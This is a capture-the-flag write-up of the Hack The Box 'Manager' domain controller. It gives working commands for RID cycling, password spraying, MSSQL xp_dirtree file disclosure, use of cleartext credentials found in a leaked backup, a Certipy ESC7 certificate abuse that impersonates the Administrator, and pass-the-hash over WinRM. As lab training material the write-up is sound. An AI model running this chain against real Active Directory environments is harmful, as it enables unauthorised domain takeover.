# HTB: Manager — Writeup

**OS:** Windows (AD / DC)
**Difficulty:** Medium
**Techniques:** RID cycling, password spray, MSSQL xp_dirtree file disclosure, ADCS ESC7

---

## Synopsis

Manager is a Medium Windows machine running a full Active Directory domain controller (`manager.htb` / `dc01`). An anonymous SMB session allows RID cycling to recover the domain user list, and a username-as-password spray lands the `operator` account (the password is the lowercase username). `operator` has MSSQL access but no command execution; `xp_dirtree` is used to list the IIS web root, revealing a leftover site backup that is downloadable over HTTP. The backup contains an old LDAP config with `raven`'s cleartext credentials, and `raven` is in Remote Management Users, giving a WinRM shell. Enumerating AD CS with Certipy shows `raven` holds the **ManageCA** right on the enterprise CA — an **ESC7** misconfiguration. That is abused to grant an Officer role, submit and self-approve a certificate request impersonating the Administrator, authenticate via PKINIT to recover the Administrator NT hash, and pass-the-hash over WinRM for Domain Admin.

## Skills Required

- Active Directory enumeration fundamentals (SMB, LDAP, RID cycling)
- Password spraying awareness (and username/password case sensitivity)
- Basic MSSQL interaction
- Familiarity with AD CS certificate-based authentication

## Skills Learned

- Recovering a user list via RID cycling over a null/anonymous SMB session
- Using MSSQL `xp_dirtree` for file disclosure when command execution is blocked
- Identifying and exploiting ADCS **ESC7** (ManageCA → Officer → issue cert → PKINIT) with Certipy
- Working around Kerberos clock skew with `faketime`

---

## Enumeration

### Nmap

```
└──╼ [★]$ nmap -p- -vv 10.129.102.94
Discovered open port 53/tcp     # DNS
Discovered open port 88/tcp     # Kerberos
Discovered open port 135/tcp    # RPC
Discovered open port 139/tcp    # NetBIOS
Discovered open port 389/tcp    # LDAP
Discovered open port 445/tcp    # SMB
Discovered open port 80/tcp     # IIS
Discovered open port 1433/tcp   # MSSQL
Discovered open port 593/tcp    # RPC over HTTP
Discovered open port 9389/tcp   # AD Web Services
# + 636/3268/3269 LDAPS/GC, 5985 WinRM, high RPC ports
```

The Kerberos/LDAP/GC/ADWS stack identifies a **domain controller**. Alongside the AD ports, **MSSQL (1433)** and **IIS (80)** stand out as the attackable services. Added `manager.htb` and `dc01.manager.htb` to `/etc/hosts`. The IIS site is static; its contact form and directory/vhost fuzzing were dead ends.

### SMB — RID cycling

Anonymous and guest sessions could not list shares, but an anonymous session still permitted RID cycling to enumerate domain users:

```
└──╼ [★]$ lookupsid.py anonymous@manager.htb | grep SidTypeUser | awk '{print $2}' | cut -d '\' -f 2 > users.txt
```

This produced the domain users (`Zhong, Cheng, Ryan, Raven, JinWoo, ChinHae, Operator`, plus built-ins).

---

## Foothold

### Password spray (username as password)

Spraying username-as-password found nothing with the capitalized names from `lookupsid`, because AD usernames are case-insensitive but passwords are not. Lowercasing the password list landed a hit:

```
└──╼ [★]$ tr 'A-Z' 'a-z' < users.txt > users_lower.txt
└──╼ [★]$ nxc smb DC01.manager.htb -u users.txt -p users_lower.txt --no-bruteforce --continue-on-success
SMB   10.129.102.94   445   DC01   [+] manager.htb\Operator:operator
```

`operator` had SMB, MSSQL and LDAP access, but **not** WinRM. Dumping the directory with `ldapdomaindump` and reading `domain_users_by_group.html` showed the *Remote Management Users* group (the accounts allowed to log in over WinRM) has a single member — **Raven** — making her the foothold target, with Administrator as the end goal:

| CN | SAM Name | Flags | RID |
|---|---|---|---|
| Raven | Raven | NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD | 1116 |

### MSSQL `xp_dirtree` → leaked backup

`operator` could authenticate to MSSQL but not run commands:

```
SQL (MANAGER\Operator  guest@master)> xp_cmdshell whoami
ERROR: The EXECUTE permission was denied on the object 'xp_cmdshell'
```

`xp_dirtree` needs no special privilege and lists directories. Pointing it at the IIS web root revealed a backup that doesn't belong on a public site:

```
SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
...  website-backup-27-07-23-old.zip
```

Because the web root is served by IIS, the backup was downloadable directly over HTTP:

```
└──╼ [★]$ wget http://manager.htb/website-backup-27-07-23-old.zip
└──╼ [★]$ unzip website-backup-27-07-23-old.zip
  inflating: .old-conf.xml
```

`.old-conf.xml` held an LDAP config with `raven`'s cleartext password:

```xml
<access-user>
   <user>raven@manager.htb</user>
   <password>R4v3nBe5tD3veloP3r!123</password>
</access-user>
```

### WinRM as raven

```
└──╼ [★]$ nxc winrm DC01.manager.htb -u Raven -p 'R4v3nBe5tD3veloP3r!123'
WINRM   10.129.102.94   5985   DC01   [+] manager.htb\Raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!)
└──╼ [★]$ evil-winrm -i manager.htb -u Raven -p 'R4v3nBe5tD3veloP3r!123'
*Evil-WinRM* PS C:\Users\Raven\Desktop> type user.txt
```

`user.txt` retrieved.

---

## Privilege Escalation

### Clock skew workaround

Kerberos/Certipy require the clock to be close to the DC's (~7h skew here). `ntpdate` kept reverting (the hypervisor forces guest time), so `faketime` was used to offset only the command's view of time, leaving the system clock alone:

```
└──╼ [★]$ faketime -f '+7h' certipy find -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.102.94 -vulnerable -stdout
```

### ADCS ESC7 (ManageCA → Domain Admin)

Certipy flagged `raven` as holding dangerous permissions on the CA:

```
      ESC7   : User has dangerous permissions.   # raven has ManageCA on manager-DC01-CA
```

**Why it works:** ManageCA lets the holder change CA settings, including granting itself the *Officer* (ManageCertificates) role, which can approve certificate requests the CA would otherwise deny. That approval path lets a low-privileged user get a certificate for the Administrator, and an AD certificate can be used to authenticate as its subject (PKINIT).

```
# 1. Grant raven the Officer role (uses ManageCA)
└──╼ [★]$ faketime -f '+7h' certipy ca -ca manager-DC01-CA -add-officer raven -u raven@manager.htb -p '...' -dc-ip 10.129.102.94

# 2. Request a cert as administrator via SubCA — denied, but request ID 19 saved + private key kept
└──╼ [★]$ faketime -f '+7h' certipy req -ca manager-DC01-CA -template SubCA -upn administrator@manager.htb -u raven@manager.htb -p '...' -dc-ip 10.129.102.94

# 3. Approve the pending request as Officer
└──╼ [★]$ faketime -f '+7h' certipy ca -ca manager-DC01-CA -issue-request 19 -u raven@manager.htb -p '...' -dc-ip 10.129.102.94

# 4. Retrieve the issued certificate
└──╼ [★]$ faketime -f '+7h' certipy req -ca manager-DC01-CA -retrieve 19 -u raven@manager.htb -p '...' -dc-ip 10.129.102.94
[*] Wrote certificate and private key to 'administrator.pfx'
```

> ⚠️ The `-add-officer` grant resets periodically on this box; if an issue/retrieve step fails with an access error, re-run step 1 and continue.

The certificate is used to authenticate as Administrator via PKINIT, which returns the account's NT hash:

```
└──╼ [★]$ faketime -f '+7h' certipy auth -pfx administrator.pfx -dc-ip 10.129.102.94
[*] Got TGT
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

Finally, pass-the-hash over WinRM — no plaintext needed:

```
└──╼ [★]$ evil-winrm -i manager.htb -u Administrator -H ae5064c2f62317332c88629e025924ef
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```

`root.txt` retrieved.

---

## Summary of Techniques

| Stage | Technique |
|---|---|
| Enumeration | Nmap (DC fingerprint); anonymous SMB RID cycling → user list |
| Foothold | Username-as-password spray (lowercase) → `operator`; MSSQL `xp_dirtree` → leaked web-root backup → raven cleartext creds → WinRM shell |
| PrivEsc | ADCS **ESC7** (ManageCA → add-officer → request+self-approve admin cert → PKINIT NT hash → pass-the-hash) |

---

## Lessons / Takeaways

- AD boxes start by building knowledge from nothing: even when shares are locked, a null session often still allows RID cycling to recover the user list.
- Case matters in spraying — `lookupsid` returns capitalized names, but the password may be lowercase. Spray both cases.
- When MSSQL command execution is blocked, `xp_dirtree` is still a powerful *read* primitive — and a file in the IIS web root is retrievable over HTTP regardless of how you discovered it.
- ESC7 turns a single CA permission (ManageCA) into Domain Admin. The `certipy find` output may say "could not find templates" — that is noise; the ESC flag is the finding.
- Keep `faketime` in the toolkit for Kerberos clock skew when you can't (or don't want to) change the system clock.
